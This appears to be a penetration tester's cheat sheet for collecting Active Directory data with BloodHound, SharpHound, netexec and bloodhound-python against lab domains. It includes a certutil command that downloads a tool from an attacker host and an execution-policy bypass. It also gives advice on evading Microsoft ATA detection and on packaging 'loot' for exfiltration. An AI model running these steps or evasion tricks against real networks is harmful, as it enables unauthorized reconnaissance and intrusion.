
# Using Sharphound.exe :

#### Enable Sharp-Hound and execute
```bash
# https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe

# Download SharpHound (the data collector)
certutil -urlcache -split -f http://10.250.1.6:8000/SharpHound.exe SharpHound.exe

# Import the PowerShell module
. .\SharpHound.ps1

# CollectionMethod All = collects everything: groups, users, computers, ACLs, local admins, trusts, sessions, SPNs
# LoggedOn = also captures who is currently logged into each machine (generates network traffic to every computer)
# This is the noisiest option - Microsoft Defender/ATA will definitely notice
Invoke-BloodHound -CollectionMethod All,LoggedOn

# Domain = specify which domain to target (useful in multi-domain environments)
# ZipFileName = saves output as a zip file (easier to transfer and load into BloodHound)
# This creates a single file you can exfiltrate
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

```
#### To avoid detections like ATA
```powershell
# Why exclude DCs?
# - Domain Controllers are heavily monitored by Blue Teams
# - Microsoft ATA (Advanced Threat Analytics) specifically alerts on DC enumeration
# - DCs have advanced logging (Event ID 4662, 4663 for directory access)
# - Any unusual LDAP query to a DC triggers high-severity alert
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```


___
# Using LDAP :

```bash
# it will create a zip
nxc ldap $t -u "" -p "" --bloodhound --collection All --dns-server $t
```

___
# Using Bloodhound python :

```bash
bloodhound-python -c All -u '' -p '' -d fluffy.htb -ns $t
```

____
### Using SharpHound.PS1

```bash
# Start PowerShell with execution bypass
# -ep bypass = Bypasses PowerShell's security restrictions (allows running unsigned scripts)
powershell -ep bypass

# Load SharpHound
. .\SharpHound.ps1

# Collect ALL Active Directory data and save to zip file
# -CollectionMethod All      = Groups, users, computers, ACLs, sessions, SPNs, trusts
# -Domain bear.local         = Target domain (only collects from this domain)
# -ZipFileName loot.zip      = Output file name (easy to exfiltrate and import to BloodHound)
Invoke-BloodHound -CollectionMethod All -Domain bear.local -ZipFileName loot.zip
```
____

# Start neo4j and BloodHound UI on kali machine and load the zip/json files

```shell
# Start BloodHound on Kali to analyze
sudo neo4j console&;bloodhound&
```